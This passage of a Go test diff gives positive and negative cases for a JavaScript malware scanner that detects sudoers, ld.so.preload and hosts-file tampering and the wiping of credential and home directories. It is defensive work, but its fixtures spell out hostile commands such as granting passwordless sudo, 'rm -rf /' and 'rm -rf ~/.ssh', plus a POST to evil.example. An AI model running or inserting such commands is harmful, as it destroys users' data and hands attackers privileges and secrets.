+			// codex round 3 #3: spawn('sh', ['-c', '<script>']) runs a shell,
+			// so a redirect in the script argument is a real write.
+			name:    "spawnSync sh -c shell write to sudoers -> CRITICAL",
+			content: "const cp = require('child_process');\ncp.spawnSync('sh', ['-c', \"echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x\"]);\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			// codex round 3 #2: a child_process binding that only appears
+			// inside a doc string must not register a real object's .exec as a
+			// shell write.
+			name:    "child_process binding inside a doc string is not a real binding",
+			content: "const help = \"const cp = require('child_process')\";\nconst cp = { exec: (s) => s };\ncp.exec('echo x >> /etc/sudoers.d/x');\n",
+			rule:    "",
+		},
+		{
+			// codex round 4 #2: a fixture/temp path that merely contains
+			// /etc/... mid-path is not the host surface.
+			name:    "fs write to /tmp/etc/ld.so.preload (mid-path) is not the host file",
+			content: "const fs = require('fs');\nfs.writeFileSync('/tmp/etc/ld.so.preload', x);\n",
+			rule:    "",
+		},
+		{
+			// codex round 4 #1: 'sh'/'-c' as literal argv data to a non-shell
+			// program (echo) is not a shell invocation.
+			name:    "spawn echo with sh -c as argv data is not a shell write",
+			content: "const cp = require('child_process');\ncp.spawn('echo', ['sh', '-c', 'x >> /etc/sudoers.d/y']);\n",
+			rule:    "",
+		},
+		{
+			// codex round 5 #1: execa('sh', ['-c', ...]) runs a shell.
+			name:    "execa sh -c shell write to sudoers + grant -> CRITICAL",
+			content: "const { execa } = require('execa');\nawait execa('sh', ['-c', \"echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x\"]);\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			// codex round 5 #1: execaCommand('sh -c "..."') runs a shell.
+			name:    "execaCommand sh -c shell write to ld.so.preload -> HIGH",
+			content: "const { execaCommand } = require('execa');\nawait execaCommand(\"sh -c 'echo /tmp/x.so > /etc/ld.so.preload'\");\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+		{
+			// codex round 5 #1: a plain execa (no shell) does not interpret a
+			// redirect-looking argument.
+			name:    "plain execa with redirect-looking arg is not a shell write",
+			content: "const { execa } = require('execa');\nawait execa('echo', ['x >> /etc/sudoers.d/y']);\n",
+			rule:    "",
+		},
+		{
+			// codex round 5 #2: a quoted redirect target is still a real write.
+			name:    "shell tee to quoted ld.so.preload path -> HIGH",
+			content: "require('child_process').execSync('cat x | tee \"/etc/ld.so.preload\"');\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+		{
+			// codex round 6 #1: a sed -i against a mid-path /tmp/etc/... is not
+			// the host file.
+			name:    "shell sed -i against /tmp/etc/ld.so.preload (mid-path) is not the host file",
+			content: "require('child_process').execSync(\"sed -i 's/a/b/' /tmp/etc/ld.so.preload\");\n",
+			rule:    "",
+		},
+		{
+			// codex round 6 #2: clustered shell flags (bash -lc) still run the
+			// command string.
+			name:    "spawnSync bash -lc shell write to sudoers -> CRITICAL",
+			content: "const cp = require('child_process');\ncp.spawnSync('bash', ['-lc', \"echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x\"]);\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			// codex round 6 #3: a sensitive domain in an UNRELATED part of the
+			// shell command (a curl) does not bind to the /etc/hosts write;
+			// without a strong partner it must not fire.
+			name:    "shell hosts write + unrelated github curl (no partner) is not a write",
+			content: "require('child_process').execSync(\"echo '127.0.0.1 local' >> /etc/hosts; curl https://github.com/x\");\n",
+			rule:    "",
+		},
+		{
+			// codex round 7 #1: only the argument right after -c is the shell
+			// script; a redirect in a later positional param ($1) is not run.
+			name:    "spawn sh -c with redirect in a positional param is not a write",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'echo ok', '_', 'echo x >> /etc/sudoers.d/y']);\n",
+			rule:    "",
+		},
+		{
+			// codex round 7 #1: same for a clustered -lc flag.
+			name:    "execa bash -lc with redirect in a positional param is not a write",
+			content: "const { execa } = require('execa');\nawait execa('bash', ['-lc', 'echo ok', 'echo x >> /etc/sudoers.d/y']);\n",
+			rule:    "",
+		},
+		{
+			// codex round 7 #2: a hostname that merely contains a sensitive
+			// token as a substring (notgithub.com) is a different domain.
+			name:    "fs hosts write with notgithub.com substring is not a sensitive domain",
+			content: "const fs = require('fs');\nfs.appendFileSync('/etc/hosts', '127.0.0.1 notgithub.com.local');\n",
+			rule:    "",
+		},
+		{
+			// codex round 8: a sensitive domain only in the options argument
+			// (not the written data) does not satisfy the resolver gate.
+			name:    "fs hosts write with sensitive domain only in options is not a write",
+			content: "const fs = require('fs');\nfs.writeFileSync('/etc/hosts', '127.0.0.1 local', { note: 'github.com' });\n",
+			rule:    "",
+		},
+		{
+			// codex round 9: a shell redirect of a sensitive-domain line into
+			// /etc/hosts is a resolver tamper even without another partner.
+			name:    "shell echo sensitive domain >> /etc/hosts -> HIGH",
+			content: "require('child_process').execSync(\"echo '1.2.3.4 github.com' >> /etc/hosts\");\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+		{
+			// codex round 10 #2: -c must be the FIRST argv element to be the
+			// shell option; here sh runs script.sh and -c is a positional
+			// parameter, so the following string is not an executed script.
+			name:    "spawn sh script.sh then -c positional is not a shell write",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['script.sh', '-c', 'echo x >> /etc/sudoers.d/x']);\n",
+			rule:    "",
+		},
+		{
+			// codex round 11: a sensitive domain in an EARLIER command (curl)
+			// is not the content written to /etc/hosts; the gate binds to the
+			// pipeline segment feeding the redirect.
+			name:    "earlier curl github then plain hosts write (no domain in segment) is not a write",
+			content: "require('child_process').execSync(\"curl https://github.com/x; echo '127.0.0.1 local' >> /etc/hosts\");\n",
+			rule:    "",
+		},
+		{
+			// round 11 regression: a pipe still feeds tee, so the grant in the
+			// piped echo is part of the written content -> CRITICAL.
+			name:    "echo grant piped to sudo tee sudoers -> CRITICAL",
+			content: "require('child_process').execSync(\"echo 'u ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/x\");\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			// codex round 12: a prefix concatenation (tmp + '/etc/...') targets
+			// a path under the prefix, not the host file.
+			name:    "fs write to tmp + '/etc/ld.so.preload' concat is not the host file",
+			content: "const fs = require('fs');\nconst tmp = require('os').tmpdir();\nfs.writeFileSync(tmp + '/etc/ld.so.preload', data);\n",
+			rule:    "",
+		},
+		{
+			// codex round 12: template-literal prefix is also under the prefix.
+			name:    "fs write to template `${tmp}/etc/hosts` is not the host file",
+			content: "const fs = require('fs');\nfs.writeFileSync(`${tmp}/etc/hosts`, '1.2.3.4 github.com');\n",
+			rule:    "",
+		},
+		{
+			// codex round 13: a JS concat suffix on an exact fs path targets a
+			// sibling file (/etc/sudoers.bak), not the host file.
+			name:    "fs write to '/etc/sudoers' + '.bak' concat suffix is not the host file",
+			content: "const fs = require('fs');\nfs.writeFileSync('/etc/sudoers' + '.bak', data);\n",
+			rule:    "",
+		},
+		{
+			// codex round 13: same JS concat suffix inside a shell command.
+			name:    "shell redirect to '/etc/sudoers' + '.bak' concat suffix is not the host file",
+			content: "require('child_process').execSync('echo x >> /etc/sudoers' + '.bak');\n",
+			rule:    "",
+		},
+		{
+			// codex round 14: a template interpolation suffix also evaluates to
+			// a sibling file.
+			name:    "fs write to template /etc/sudoers${'.bak'} suffix is not the host file",
+			content: "const fs = require('fs');\nfs.writeFileSync(`/etc/sudoers${'.bak'}`, data);\n",
+			rule:    "",
+		},
+		{
+			// codex round 14: same template suffix inside a shell command.
+			name:    "shell redirect to template /etc/hosts${'.allow'} suffix is not the host file",
+			content: "require('child_process').execSync(`echo x >> /etc/hosts${'.allow'}`);\n",
+			rule:    "",
+		},
+		{
+			// codex round 15: a separate shell option before -c (bash -e -c)
+			// still runs the command string.
+			name:    "spawnSync bash -e -c shell write to sudoers -> CRITICAL",
+			content: "const cp = require('child_process');\ncp.spawnSync('bash', ['-e', '-c', \"echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/x\"]);\n",
+			rule:    RuleSudoersTamper, crit: true,
+		},
+		{
+			// codex round 15: same with the inline command-string form.
+			name:    "execaCommand bash -e -c shell write to ld.so.preload -> HIGH",
+			content: "const { execaCommand } = require('execa');\nawait execaCommand(\"bash -e -c 'echo /tmp/x.so > /etc/ld.so.preload'\");\n",
+			rule:    RuleHostTrustTamper, crit: false,
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			findings := analyze(t, "index.js", c.content)
+			sudoers := hasRule(findings, RuleSudoersTamper)
+			host := hasRule(findings, RuleHostTrustTamper)
+			switch c.rule {
+			case "":
+				if sudoers || host {
+					t.Fatalf("expected no host-tamper finding, got sudoers=%v host=%v (%+v)", sudoers, host, findings)
+				}
+			default:
+				if !hasRule(findings, c.rule) {
+					t.Fatalf("expected %s, got findings %+v", c.rule, findings)
+				}
+				f := findRule(findings, c.rule)
+				if c.crit && f.Severity != types.SeverityCritical {
+					t.Errorf("expected CRITICAL, got %+v", f)
+				}
+				if !c.crit && f.Severity != types.SeverityHigh {
+					t.Errorf("expected HIGH, got %+v", f)
+				}
+			}
+		})
+	}
+}
+
+func TestWiperTripwire(t *testing.T) {
+	cases := []struct {
+		name, content string
+		want          bool // expect JS_WIPER_TRIPWIRE_001
+		crit          bool
+	}{
+		// --- true positives: home-only credential/history/honeytoken (HIGH) ---
+		{
+			name:    "fs rmSync .ssh (home-only) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync /home/u/.aws -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/user/.aws', { recursive: true, force: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs-extra removeSync .aws -> HIGH",
+			content: "const fse = require('fs-extra');\nfse.removeSync('.aws');\n",
+			want:    true,
+		},
+		{
+			name:    "rimraf .kube -> HIGH",
+			content: "const rimraf = require('rimraf');\nrimraf('.kube', () => {});\n",
+			want:    true,
+		},
+		{
+			name:    "fs.promises destructured rm .gnupg -> HIGH",
+			content: "const { rm } = require('fs').promises;\nawait rm('.gnupg', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs unlinkSync .bash_history -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.bash_history');\n",
+			want:    true,
+		},
+		{
+			name:    "fs unlinkSync .canary honeytoken -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.canary');\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync .canarytokens -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('.canarytokens', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync .docker (home-only) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/dev/.docker', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			name:    "fs rmSync .config/gcloud -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/dev/.config/gcloud', { recursive: true });\n",
+			want:    true,
+		},
+		// --- shell home-only ---
+		{
+			name:    "shell rm -rf ~/.gnupg -> HIGH",
+			content: "require('child_process').execSync('rm -rf ~/.gnupg');\n",
+			want:    true,
+		},
+		{
+			name:    "shell find ~/.ssh -delete -> HIGH",
+			content: "require('child_process').execSync('find ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			name:    "spawn sh -c rm -rf ~/.ssh -> HIGH",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['-c', 'rm -rf ~/.ssh']);\n",
+			want:    true,
+		},
+		{
+			name:    "shelljs exec rm -rf ~/.aws -> HIGH",
+			content: "const sh = require('shelljs');\nsh.exec('rm -rf ~/.aws');\n",
+			want:    true,
+		},
+		// --- project-capable: home-anchored fires (HIGH) ---
+		{
+			name:    "shell unlink ~/.npmrc (anchored) -> HIGH",
+			content: "require('child_process').execSync('unlink ~/.npmrc');\n",
+			want:    true,
+		},
+		{
+			name:    "fs unlinkSync /home/u/.npmrc (anchored) -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/dev/.npmrc');\n",
+			want:    true,
+		},
+		{
+			name:    "shell rm ~/CLAUDE.md (anchored) -> HIGH",
+			content: "require('child_process').execSync('rm ~/CLAUDE.md');\n",
+			want:    true,
+		},
+		// --- project-capable bare + strong partner -> CRITICAL ---
+		{
+			name:    "delete .env bare + fetch exfil -> CRITICAL",
+			content: "const fs = require('fs');\nfs.unlinkSync('.env');\nfetch('https://evil.example/x', { method: 'POST', body: d });\n",
+			want:    true, crit: true,
+		},
+		// --- home-only + strong partner -> CRITICAL ---
+		{
+			name:    "delete .ssh + Bun second stage -> CRITICAL",
+			content: "const fs = require('fs');\nrequire('child_process').spawn('bun', ['./s.mjs']);\nfs.rmSync('.ssh', { recursive: true });\n",
+			want:    true, crit: true,
+		},
+		// --- broad wipe -> CRITICAL ---
+		{
+			name:    "fs.rmSync(os.homedir()) broad wipe -> CRITICAL",
+			content: "const os = require('os');\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: true, force: true });\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "fs.rmSync(process.env.HOME) broad wipe -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync(process.env.HOME, { recursive: true, force: true });\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf $HOME -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf $HOME');\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf ~ -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf ~');\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf / root wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /');\n",
+			want:    true, crit: true,
+		},
+		{
+			name:    "shell rm -rf /home/dev home root -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /home/dev');\n",
+			want:    true, crit: true,
+		},
+		// --- two distinct families -> CRITICAL ---
+		{
+			name:    "delete .ssh + .aws (two families) -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\nfs.rmSync('.aws', { recursive: true });\n",
+			want:    true, crit: true,
+		},
+		// --- two files SAME family stays HIGH (refinement 1) ---
+		{
+			name:    "delete .ssh/id_rsa + .ssh/known_hosts (one family) -> HIGH",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh/id_rsa');\nfs.unlinkSync('.ssh/known_hosts');\n",
+			want:    true, crit: false,
+		},
+		// --- .ssh (fires) + .npmrc bare (does not, no partner): one family HIGH ---
+		{
+			name:    "delete .ssh + bare .npmrc (npmrc quiet) -> HIGH not CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync('.ssh', { recursive: true });\nfs.unlinkSync('.npmrc');\n",
+			want:    true, crit: false,
+		},
+
+		// --- false positives ---
+		{
+			name:    "rimraf dist is build cleanup",
+			content: "const rimraf = require('rimraf');\nrimraf('dist', () => {});\n",
+			want:    false,
+		},
+		{
+			name:    "rm -rf node_modules is cleanup",
+			content: "require('child_process').execSync('rm -rf node_modules');\n",
+			want:    false,
+		},
+		{
+			name:    "fs.rmSync ./coverage is cleanup",
+			content: "const fs = require('fs');\nfs.rmSync('./coverage', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "fs.rmSync build is cleanup",
+			content: "const fs = require('fs');\nfs.rmSync('build', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "/tmp/.ssh fixture under benign dir is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync('/tmp/.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "rm -rf /tmp/project-cache is cleanup",
+			content: "require('child_process').execSync('rm -rf /tmp/project-cache');\n",
+			want:    false,
+		},
+		{
+			name:    ".env.example sibling is not .env",
+			content: "const fs = require('fs');\nfs.unlinkSync('.env.example');\n",
+			want:    false,
+		},
+		{
+			name:    ".npmrc.sample sibling is not .npmrc",
+			content: "const fs = require('fs');\nfs.unlinkSync('.npmrc.sample');\n",
+			want:    false,
+		},
+		{
+			name:    ".ssh.bak sibling is not .ssh",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/u/.ssh.bak');\n",
+			want:    false,
+		},
+		{
+			name:    "canary.txt is not the .canary honeytoken",
+			content: "const fs = require('fs');\nfs.unlinkSync('canary.txt');\n",
+			want:    false,
+		},
+		{
+			name:    "my-canary-file is not the .canary honeytoken",
+			content: "const fs = require('fs');\nfs.unlinkSync('my-canary-file');\n",
+			want:    false,
+		},
+		{
+			name:    "bare .npmrc no partner stays quiet",
+			content: "const fs = require('fs');\nfs.unlinkSync('.npmrc');\n",
+			want:    false,
+		},
+		{
+			name:    "bare .env no partner stays quiet",
+			content: "const fs = require('fs');\nfs.unlinkSync('.env');\n",
+			want:    false,
+		},
+		{
+			name:    "constructed template prefix ${tmp}/.ssh is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync(`${tmp}/.ssh`, { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "constructed concat prefix tmp + '/.ssh' is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync(tmp + '/.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    "comment mentioning rm -rf ~/.ssh",
+			content: "// cleanup step: rm -rf ~/.ssh if present\nconst x = 1;\n",
+			want:    false,
+		},
+		{
+			name:    "doc string of a delete command is not a call",
+			content: "const example = \"rm -rf ~/.ssh\";\nconsole.log(example);\n",
+			want:    false,
+		},
+		{
+			name:    "db.exec delete is not a bound shell or fs delete",
+			content: "const db = getDb();\ndb.exec(\"rm -rf ~/.ssh\");\n",
+			want:    false,
+		},
+		{
+			name:    "local writer.unlinkSync not bound to fs",
+			content: "const writer = makeWriter();\nwriter.unlinkSync('/home/u/.ssh');\n",
+			want:    false,
+		},
+		{
+			name:    "spawn echo with rm argv data is not a shell delete",
+			content: "const cp = require('child_process');\ncp.spawn('echo', ['rm -rf ~/.ssh']);\n",
+			want:    false,
+		},
+		{
+			name:    "spawn sh script.sh then -c positional is not a shell delete",
+			content: "const cp = require('child_process');\ncp.spawn('sh', ['script.sh', '-c', 'rm -rf ~/.ssh']);\n",
+			want:    false,
+		},
+		{
+			name:    "find ~/.ssh without -delete is a read",
+			content: "require('child_process').execSync('find ~/.ssh -type f');\n",
+			want:    false,
+		},
+		{
+			name:    "npm cache clean is not a sensitive delete",
+			content: "require('child_process').execSync('npm cache clean --force');\n",
+			want:    false,
+		},
+		{
+			name:    "os.tmpdir() delete is not a home wipe",
+			content: "const fs = require('fs');\nfs.rmSync(os.tmpdir(), { recursive: true });\n",
+			want:    false,
+		},
+		{
+			name:    ".git-credentials.bak sibling is not the credential file",
+			content: "const fs = require('fs');\nfs.unlinkSync('/home/u/.git-credentials.bak');\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #1: a sensitive path after another rm operand.
+			name:    "rm -rf dist ~/.ssh (sensitive as later operand) -> HIGH",
+			content: "require('child_process').execSync('rm -rf dist ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 1 #1: a sensitive path after the -- sentinel.
+			name:    "rm -rf -- ~/.aws (after -- sentinel) -> HIGH",
+			content: "require('child_process').execSync('rm -rf -- ~/.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 1 #2: a template suffix extends the component into a
+			// constructed (unknown) path.
+			name:    "fs.rmSync(`.ssh${suffix}`) constructed suffix is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync(`.ssh${suffix}`, { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 1 #2 sibling: a concat suffix on the component.
+			name:    "fs.unlinkSync('.ssh' + suffix) concat suffix is not a wipe",
+			content: "const fs = require('fs');\nfs.unlinkSync('.ssh' + suffix);\n",
+			want:    false,
+		},
+		{
+			// codex round 2: an rm command that is only ECHOED (an argument,
+			// not a command position) is not a real delete.
+			name:    "echo of an rm command is not a delete",
+			content: "require('child_process').execSync('echo rm -rf ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// round 2 regression: a wrapper (sudo) before rm is still a delete.
+			name:    "sudo rm -rf ~/.ssh -> HIGH",
+			content: "require('child_process').execSync('sudo rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 3 #1: a QUOTED rm inside echo is printed data, not a
+			// command (the inner quote is not a command boundary).
+			name:    "echo of a quoted rm command is not a delete",
+			content: "require('child_process').execSync('echo \"rm -rf ~/.ssh\"');\n",
+			want:    false,
+		},
+		{
+			// codex round 3 #2: ${HOME} is a home anchor for project-capable
+			// files just like $HOME and ~.
+			name:    "rm -rf ${HOME}/.npmrc (anchored) -> HIGH",
+			content: "require('child_process').execSync('rm -rf ${HOME}/.npmrc');\n",
+			want:    true,
+		},
+		{
+			// codex round 4 #1: a globbed root wipe.
+			name:    "shell rm -rf /* root glob wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf /*');\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 4 #1: a globbed home wipe.
+			name:    "shell rm -rf $HOME/* home glob wipe -> CRITICAL",
+			content: "require('child_process').execSync('rm -rf $HOME/*');\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 4 #1: /tmp/* glob is cleanup, not a wipe.
+			name:    "shell rm -rf /tmp/* glob is cleanup",
+			content: "require('child_process').execSync('rm -rf /tmp/*');\n",
+			want:    false,
+		},
+		{
+			// codex round 4 #2: modern named rimraf import (CJS destructure).
+			name:    "named rimraf destructure delete .ssh -> HIGH",
+			content: "const { rimraf } = require('rimraf');\nawait rimraf('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 4 #2: modern named rimraf import (ESM).
+			name:    "named rimraf ESM import delete .aws -> HIGH",
+			content: "import { rimraf } from 'rimraf';\nawait rimraf('.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 5 #1: a delete inside an if-condition is real.
+			name:    "shell if rm -rf ~/.ssh condition -> HIGH",
+			content: "require('child_process').execSync('if rm -rf ~/.ssh; then echo ok; fi');\n",
+			want:    true,
+		},
+		{
+			// codex round 5 #1: a delete inside a while-condition is real.
+			name:    "shell while rm -rf ~/.aws condition -> HIGH",
+			content: "require('child_process').execSync('while rm -rf ~/.aws; do :; done');\n",
+			want:    true,
+		},
+		{
+			// codex round 5 #2: Node does not expand ~ in an fs path, so a
+			// literal '~' is a directory named ~, not a home wipe.
+			name:    "fs.rmSync('~') literal tilde dir is not a home wipe",
+			content: "const fs = require('fs');\nfs.rmSync('~', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 5 #2: same for a literal '$HOME' fs path.
+			name:    "fs.rmSync('$HOME') literal is not a home wipe",
+			content: "const fs = require('fs');\nfs.rmSync('$HOME', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 6 #1: rimraf namespace property call.
+			name:    "rimraf namespace rr.rimraf(.ssh) -> HIGH",
+			content: "const rr = require('rimraf');\nawait rr.rimraf('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 6 #1: rimraf namespace .sync property call.
+			name:    "rimraf namespace rr.sync(.aws) -> HIGH",
+			content: "import * as rr from 'rimraf';\nrr.sync('.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 6 #2: echo of a wrapper-prefixed rm is printed text;
+			// the wrapper (sudo) must itself be at a command start.
+			name:    "echo sudo rm -rf ~/.ssh is printed text, not a delete",
+			content: "require('child_process').execSync('echo sudo rm -rf ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 7 #1: a .. traversal escapes the benign /tmp prefix
+			// and resolves under /home/u/.ssh.
+			name:    "fs.rmSync /tmp/../home/u/.ssh traversal is a real wipe -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/tmp/../home/u/.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// codex round 7 #2: $HOME_BACKUP is a different variable, not the
+			// HOME anchor, so the path is constructed/unknown.
+			name:    "shell rm -rf $HOME_BACKUP/.ssh is a constructed path",
+			content: "require('child_process').execSync('rm -rf $HOME_BACKUP/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 7 #2: $HOMEDIR is also a different variable.
+			name:    "shell rm -rf $HOMEDIR/.npmrc is a constructed path",
+			content: "require('child_process').execSync('rm -rf $HOMEDIR/.npmrc');\n",
+			want:    false,
+		},
+		{
+			// codex round 8 #1: an empty string literal is a no-op, not root.
+			name:    "fs.rmSync('') empty literal is not a root wipe",
+			content: "const fs = require('fs');\nfs.rmSync('', { force: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 8 #2: a wrapper option between sudo and rm.
+			name:    "sudo -n rm -rf ~/.ssh -> HIGH",
+			content: "require('child_process').execSync('sudo -n rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 8 #2: an env assignment before rm.
+			name:    "env FOO=1 rm -rf ~/.aws -> HIGH",
+			content: "require('child_process').execSync('env FOO=1 rm -rf ~/.aws');\n",
+			want:    true,
+		},
+		{
+			// codex round 9: inline require('rimraf').sync(...).
+			name:    "inline require('rimraf').sync('.ssh') -> HIGH",
+			content: "require('rimraf').sync('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 9: inline require('rimraf')(...) (older callable).
+			name:    "inline require('rimraf')('.aws') -> HIGH",
+			content: "require('rimraf')('.aws', () => {});\n",
+			want:    true,
+		},
+		{
+			// codex round 10 #1: rm glued to an assignment value (FOO=rm) is
+			// not a command; the command is echo.
+			name:    "FOO=rm echo ~/.ssh assignment value is not a delete",
+			content: "require('child_process').execSync('FOO=rm echo ~/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 10 #2: combined default rimraf ESM import.
+			name:    "combined default rimraf import delete .ssh -> HIGH",
+			content: "import rimraf, { sync } from 'rimraf';\nawait rimraf('.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 11 #1: inline require('os').homedir() broad wipe.
+			name:    "fs.rmSync(require('os').homedir()) broad wipe -> CRITICAL",
+			content: "const fs = require('fs');\nfs.rmSync(require('os').homedir(), { recursive: true, force: true });\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 11 #1: a mock object named os is not the os module.
+			name:    "fs.rmSync(os.homedir()) with mock os is not a home wipe",
+			content: "const os = { homedir: () => '/tmp/build' };\nconst fs = require('fs');\nfs.rmSync(os.homedir(), { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 11 #2: a local helper ending in 'require' is not the
+			// module require.
+			name:    "myrequire('rimraf')('.ssh') is not a bound rimraf delete",
+			content: "const myrequire = makeRequire();\nmyrequire('rimraf')('.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 12 #1: /home/<u> where the username matches a benign
+			// dir name (tmp) is still a real home credential wipe.
+			name:    "fs.rmSync /home/tmp/.ssh (username tmp) -> HIGH",
+			content: "const fs = require('fs');\nfs.rmSync('/home/tmp/.ssh', { recursive: true });\n",
+			want:    true,
+		},
+		{
+			// codex round 13 #1: a filtered find rooted at $HOME deletes
+			// matching files, not the home root -> not a broad wipe.
+			name:    "find $HOME -name '*.log' -delete is filtered cleanup",
+			content: "require('child_process').execSync('find $HOME -name \"*.log\" -delete');\n",
+			want:    false,
+		},
+		{
+			// codex round 13 #1 regression: find rooted at a sensitive path
+			// still fires.
+			name:    "find ~/.ssh -type f -delete -> HIGH",
+			content: "require('child_process').execSync('find ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			// codex round 14 #1: an fs glob literal is not shell-expanded, so
+			// /home/u/* is a literal path, not a home wipe.
+			name:    "fs.rmSync('/home/u/*') literal glob is not a wipe",
+			content: "const fs = require('fs');\nfs.rmSync('/home/u/*', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 14 #2: find with multiple roots must scan each.
+			name:    "find /tmp ~/.ssh -type f -delete (second root sensitive) -> HIGH",
+			content: "require('child_process').execSync('find /tmp ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			// codex round 14 #3: a wrapper option that takes a value
+			// (sudo -u root) still precedes a real delete.
+			name:    "sudo -u root rm -rf ~/.ssh -> HIGH",
+			content: "require('child_process').execSync('sudo -u root rm -rf ~/.ssh');\n",
+			want:    true,
+		},
+		{
+			// codex round 15 #1: a partially quoted home glob ("$HOME"/*).
+			name:    `shell rm -rf "$HOME"/* partial-quote home glob -> CRITICAL`,
+			content: "require('child_process').execSync('rm -rf \"$HOME\"/*');\n",
+			want:    true, crit: true,
+		},
+		{
+			// codex round 15 #2: find with a leading global option (-L).
+			name:    "find -L ~/.ssh -type f -delete (leading option) -> HIGH",
+			content: "require('child_process').execSync('find -L ~/.ssh -type f -delete');\n",
+			want:    true,
+		},
+		{
+			// codex round 16 #1: a shell command assembled by concatenation is
+			// dynamic; a later fragment is not a real operand.
+			name:    "execSync('rm -rf ' + tmp + '/.ssh') concat command is not a wipe",
+			content: "require('child_process').execSync('rm -rf ' + tmp + '/.ssh');\n",
+			want:    false,
+		},
+		{
+			// codex round 16 #2: Node does not expand ~ in an fs literal, so
+			// '~/.ssh' is a literal path, not the home credential store.
+			name:    "fs.rmSync('~/.ssh') literal tilde prefix is not a home path",
+			content: "const fs = require('fs');\nfs.rmSync('~/.ssh', { recursive: true });\n",
+			want:    false,
+		},
+		{
+			// codex round 16 #2: same for a literal $HOME prefix in fs.
+			name:    "fs.unlinkSync('$HOME/.aws') literal is not a home path",
+			content: "const fs = require('fs');\nfs.unlinkSync('$HOME/.aws');\n",
+			want:    false,
+		},
+		{
+			// codex round 17: a -delete substring in a filename pattern is not
+			// the find -delete predicate.
+			name:    "find ~/.ssh -name '*-delete' (no real -delete) is a read",
